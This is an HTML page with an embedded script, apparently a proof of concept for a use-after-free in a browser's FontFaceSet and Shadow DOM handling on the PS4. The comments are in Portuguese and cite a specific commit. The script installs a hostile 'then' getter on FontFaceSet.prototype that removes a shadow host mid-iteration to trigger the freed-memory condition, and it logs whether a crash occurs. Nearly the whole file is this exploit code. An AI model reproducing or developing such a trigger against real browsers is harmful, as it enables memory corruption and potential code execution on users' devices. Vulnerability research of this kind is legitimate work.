
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<pre id="log"></pre>
<script>
// V5: baseado no diagnostico que CONFIRMOU o getter disparando via async
// Agora com host.remove() para tentar o UAF real
// Mantém execução inline (não window.onload) como no diagnostico

function log(s) {
    document.getElementById('log').textContent += s + '\n';
}

// Touch antes do load event (essencial para completedLoading() settlar fonts.ready)
document.fonts;

// Setup Shadow DOM
var host = document.createElement('div');
document.body.appendChild(host);
var shadow = host.attachShadow({ mode: 'open' });

// DATA URL base64 longa = parse como macrotask separada (como no diagnostico)
// Isso garante que completedLoading() dispare via caminho async → thenable check
var pendingUrl = 'data:font/woff;base64,' + 'A'.repeat(150000);
var style = document.createElement('style');
style.textContent =
    '@font-face { font-family: reentryFont; src: url("' + pendingUrl + '"); }' +
    '.probe { font: 24px reentryFont; }';
shadow.appendChild(style);

var probe = document.createElement('span');
probe.className = 'probe';
probe.textContent = 'A';
shadow.appendChild(probe);

// Forca layout para iniciar o carregamento
document.body.offsetHeight;
document.fonts.load('24px reentryFont', 'A');
log('status: ' + document.fonts.status);

// Materializa fonts.ready (necessario para thenable assimilation)
document.fonts.ready;

// Prepend ANTES do getter (para criar pendencia UpdateType::ActiveSet)
// NO PS4: o prepend nao faz o getter disparar de forma sincrona
// mas cria o estado de pendencia para quando completedLoading() disparar async
var prependedStyle = document.createElement('style');
prependedStyle.textContent = '.unused { color: red; }';
shadow.prepend(prependedStyle);
log('apos prepend. status=' + document.fonts.status);

// Instala getter COM host.remove() — agora que sabemos que dispara
var getterCount = 0;
Object.defineProperty(FontFaceSet.prototype, 'then', {
    configurable: true,
    get: function() {
        delete FontFaceSet.prototype.then;
        getterCount++;
        log('>>> GETTER DISPAROU! count=' + getterCount);
        log('    status no momento: ' + document.fonts.status);
        // HOST.REMOVE() = libera no iterado → UAF se flushPendingDescendantUpdates
        // estiver na call stack (como descrito no commit 86074ba)
        host.remove();
        log('    apos host.remove() — sem crash ate aqui');
        return undefined;
    }
});

log('getter instalado. status=' + document.fonts.status);
log('aguardando completedLoading() async...');

// Microtask checkpoint
Promise.resolve().then(function() {
    log('microtask: status=' + document.fonts.status + ' getter=' + getterCount);
});
</script>
</body>
</html>
